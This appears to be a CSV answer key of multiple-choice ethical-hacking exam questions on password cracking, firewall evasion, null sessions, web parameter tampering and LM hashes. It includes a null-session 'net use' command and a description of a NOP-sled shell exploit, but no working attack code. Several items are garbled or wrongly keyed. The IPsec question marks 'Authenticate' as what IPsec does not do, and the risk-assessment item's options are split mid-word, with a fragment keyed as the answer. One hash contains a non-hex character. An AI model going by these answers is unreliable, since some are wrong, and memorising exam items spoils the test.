"You have retrieved the raw hash values from a Windows 2000 Domain Controller. Using social engineering, you come to know that they are enforcing strong passwords. You understand that all users are required to use passwords that are at least 8 characters in length. All passwords must also use 3 of the 4 following categories: lower case letters, capital letters, numbers and special characters. With your existing knowledge of users, likely user account names and the possibility that they will choose the easiest passwords possible, what would be the fastest type of password cracking attack you can run against these hash values and still get results?\nA. Online Attack\nB. Dictionary Attack\nC. Brute Force Attack\nD. Hybrid Attack\n","Answer: D — D. Hybrid Attack"
"Take a look at the following attack on a Web Server using obstructed URL: How would you protect from these attacks?\nA. Configure the Web Server to deny requests involving ""hex encoded"" characters\nB. Create rules in IDS to alert on strange Unicode requests\nC. Use SSL authentication on Web Servers\nD. Enable Active Scripts Detection at the firewall and routers\n","Answer: B — B. Create rules in IDS to alert on strange Unicode requests"
"Which results will be returned with the following Google search query? site:target.com – site:Marketing.target.com accounting\nA. Results from matches on the site marketing.target.com that are in the domain target.com but do not include the word accounting.\nB. Results matching all words in the query.\nC. Results for matches on target.com and Marketing.target.com that include the word “accounting”\nD. Results matching “accounting” in domain target.com but not on the site Marketing.target.com\n","Answer: D — D. Results matching “accounting” in domain target.com but not on the site Marketing.target.com"
"Why should the security analyst disable/remove unnecessary ISAPI filters?\nA. To defend against social engineering attacks\nB. To defend against webserver attacks\nC. To defend against jailbreaking\nD. To defend against wireless attacks\n","Answer: B — B. To defend against webserver attacks"
"What is the way to decide how a packet will move from an untrusted outside host to a protected inside that is behind a firewall, which permits the hacker to determine which ports are open and if the packets can pass through the packet-filtering of the firewall?\nA. Session hijacking\nB. Firewalking\nC. Man-in-the middle attack\nD. Network sniffing\n","Answer: B — B. Firewalking"
"In the context of password security, a simple dictionary attack involves loading a dictionary file (a text file full of dictionary words) into a cracking application such as L0phtCrack or John the Ripper, and running it against user accounts located by the application. The larger the word and word fragment selection, the more effective the dictionary attack is. The brute force method is the most inclusive, although slow. It usually tries every possible letter and number combination in its automated exploration. If you would use both brute force and dictionary methods combined together to have variation of words, what would you call such an attack?\nA. Full Blown\nB. Thorough\nC. Hybrid\nD. BruteDics\n","Answer: C — C. Hybrid"
"Which of the following tools performs comprehensive tests against web servers, including dangerous files and CGIs?\nA. Nikto\nB. John the Ripper\nC. Dsniff\nD. Snort\n","Answer: A — A. Nikto"
"DHCP snooping is a great solution to prevent rogue DHCP servers on your network. Which security feature on switchers leverages the DHCP snooping database to help prevent man-in-the-middle attacks?\nA. Spanning tree\nB. Dynamic ARP Inspection (DAI)\nC. Port security\nD. Layer 2 Attack Prevention Protocol (LAPP)\n","Answer: B — B. Dynamic ARP Inspection (DAI)"
"Internet Protocol Security IPsec is actually a suite pf protocols. Each protocol within the suite provides different functionality. Collective IPsec does everything except.\nA. Protect the payload and the headers\nB. Encrypt\nC. Work at the Data Link Layer\nD. Authenticate\n","Answer: D — D. Authenticate"
"The following is an entry captured by a network IDS. You are assigned the task of analyzing this entry. You notice the value 0x90, which is the most common NOOP instruction for the Intel processor. You figure that the attacker is attempting a buffer overflow attack. You also notice ""/bin/sh"" in the ASCII part of the output. As an analyst what would you conclude about the attack?\nA. The buffer overflow attack has been neutralized by the IDS\nB. The attacker is creating a directory on the compromised machine\nC. The attacker is attempting a buffer overflow attack and has succeeded\nD. The attacker is attempting an exploit that launches a command-line shell\n","Answer: D — D. The attacker is attempting an exploit that launches a command-line shell"
"Steve, a scientist who works in a governmental security agency, developed a technological solution to identify people based on walking patterns and implemented this approach to a physical control access. A camera captures people walking and identifies the individuals using Steve’s approach. After that, people must approximate their RFID badges. Both the identifications are required to open the door. In this case, we can say:\nA. Although the approach has two phases, it actually implements just one authentication factor\nB. The solution implements the two authentication factors: physical object and physical characteristic\nC. The solution will have a high level of false positives\nD. Biological motion cannot be used to identify people\n","Answer: B — B. The solution implements the two authentication factors: physical object and physical characteristic"
"A regional bank hires your company to perform a security assessment on their network after a recent data breach. The attacker was able to steal financial data from the bank by compromising only a single server. Based on this information, what should be one of your key recommendations to the bank?\nA. Place a front-end web server in a demilitarized zone that only handles external web traffic\nB. Require all employees to change their anti-virus program with a new one\nC. Move the financial data to another server on the same IP subnet\nD. Issue new certificates to the web servers from the root certificate authority\n","Answer: A — A. Place a front-end web server in a demilitarized zone that only handles external web traffic"
"Which of the following is the best countermeasure to encrypting ransomwares?\nA. Use multiple antivirus softwares\nB. Pay a ransom\nC. Keep some generation of off-line backup\nD. Analyze the ransomware to get decryption key of encrypted data\n","Answer: C — C. Keep some generation of off-line backup"
"What does a firewall check to prevent particular ports and applications from getting packets into an organization?\nA. Transport layer port numbers and application layer headers\nB. Presentation layer headers and the session layer port numbers\nC. Network layer headers and the session layer port numbers\nD. Application layer port numbers and the transport layer headers\n","Answer: A — A. Transport layer port numbers and application layer headers"
"During the process of encryption and decryption, what keys are shared? During the process of encryption and decryption, what keys are shared?\nA. Private keys\nB. User passwords\nC. Public keys\nD. Public and private keys\n","Answer: C — C. Public keys"
"Which of the following is a command line packet analyzer similar to GUI-based Wireshark?\nA. nessus\nB. tcpdump\nC. ethereal\nD. jack the ripper\n","Answer: B — B. tcpdump"
"While using your bank’s online servicing you notice the following string in the URL bar: “http: // www. MyPersonalBank. com/ account?id=368940911028389&Damount=10980&Camount=21” You observe that if you modify the Damount & Camount values and submit the request, that data on the web page reflects the changes. Which type of vulnerability is present on this site?\nA. Cookie Tampering\nB. SQL Injection\nC. Web Parameter Tampering\nD. XSS Reflection\n","Answer: C — C. Web Parameter Tampering"
"Which method of password cracking takes the most time and effort?\nA. Dictionary attack\nB. Shoulder surfing\nC. Rainbow tables\nD. Brute force\n","Answer: D — D. Brute force"
"Which of the following LM hashes represent a password of less than 8 characters? (Choose two.)\nA. BA810DBA98995F1817306D272A9441BB\nB. 44EFCE164AB921CQAAD3B435B51404EE\nC. 0182BD0BD4444BF836077A718CCDF409\nD. CEC52EB9C8E3455DC2265B23734E0DAC\nE. B757BF5C0D87772FAAD3B435B51404EE\nF. E52CAC67419A9A224A3B108F3FA6CB6D\n","Answer: BE — B. 44EFCE164AB921CQAAD3B435B51404EE; E. B757BF5C0D87772FAAD3B435B51404EE"
"A user on your Windows 2000 network has discovered that he can use L0phtcrack to sniff the SMB exchanges which carry user logons. The user is plugged into a hub with 23 other systems. However, he is unable to capture any logons though he knows that other users are logging in. What do you think is the most likely reason behind this?\nA. There is a NIDS present on that segment.\nB. Kerberos is preventing it.\nC. Windows logons cannot be sniffed.\nD. L0phtcrack only sniffs logons to web servers.\n","Answer: B — B. Kerberos is preventing it."
"Yancey is a network security administrator for a large electric company. This company provides power for over 100, 000 people in Las Vegas. Yancey has worked for his company for over 15 years and has become very successful. One day, Yancey comes in to work and finds out that the company will be downsizing and he will be out of a job in two weeks. Yancey is very angry and decides to place logic bombs, viruses, Trojans, and backdoors all over the network to take down the company once he has left. Yancey does not care if his actions land him in jail for 30 or more years, he just wants the company to pay for what they are doing to him. What would Yancey be considered?\nA. Yancey would be considered a Suicide Hacker\nB. Since he does not care about going to jail, he would be considered a Black Hat\nC. Because Yancey works for the company currently; he would be a White Hat\nD. Yancey is a Hacktivist Hacker since he is standing up to a company that is downsizing\n","Answer: A — A. Yancey would be considered a Suicide Hacker"
"Which of the following steps for risk assessment methodology refers to vulnerability identification?\nA. Determines if any flaws exist in systems, policies, or procedures\nB. Assigns values to risk probabilities; Impact values.\nC. Determines risk probability that vulnerability will be exploited (Hig\nD. Medium, Low)\nE. Identifies sources of harm to an IT syste\nF. (Natural, Huma\nG. Environmental)\n","Answer: C — C. Determines risk probability that vulnerability will be exploited (Hig"
"The tools which receive event logs from servers, network equipment, and applications, and perform analysis and correlation on those logs, and can generate alarms for security relevant issues, are known as what?\nA. network Sniffer\nB. Vulnerability Scanner\nC. Intrusion prevention Server\nD. Security incident and event Monitoring\n","Answer: D — D. Security incident and event Monitoring"
"What is the following command used for? net use \targetipc$ """" /u:""""\nA. Grabbing the etc/passwd file\nB. Grabbing the SAM\nC. Connecting to a Linux computer through Samba.\nD. This command is used to connect as a null session\nE. Enumeration of Cisco routers\n","Answer: D — D. This command is used to connect as a null session"
"John the Ripper is a technical assessment tool used to test the weakness of which of the following?\nA. Passwords\nB. File permissions\nC. Firewall rulesets\nD. Usernames\n","Answer: A — A. Passwords"
"During a black-box pen test you attempt to pass IRC traffic over port 80/TCP from a compromised web enabled host. The traffic gets blocked; however, outbound HTTP traffic is unimpeded. What type of firewall is inspecting outbound traffic?\nA. Circuit\nB. Stateful\nC. Application\nD. Packet Filtering\n","Answer: B — B. Stateful"
"What term describes the amount of risk that remains after the vulnerabilities are classified and the countermeasures have been deployed?\nA. Residual risk\nB. Impact risk\nC. Deferred risk\nD. Inherent risk\n","Answer: A — A. Residual risk"
"Why is a penetration test considered to be more thorough than vulnerability scan?\nA. Vulnerability scans only do host discovery and port scanning by default.\nB. A penetration test actively exploits vulnerabilities in the targeted infrastructure, while a vulnerability scan does not typically involve active exploitation.\nC. It is not – a penetration test is often performed by an automated tool, while a vulnerability scan requires active engagement.\nD. The tools used by penetration testers tend to have much more comprehensive vulnerability databases.\n","Answer: B — B. A penetration test actively exploits vulnerabilities in the targeted infrastructure, while a vulnerability scan does not typically involve active exploitation."
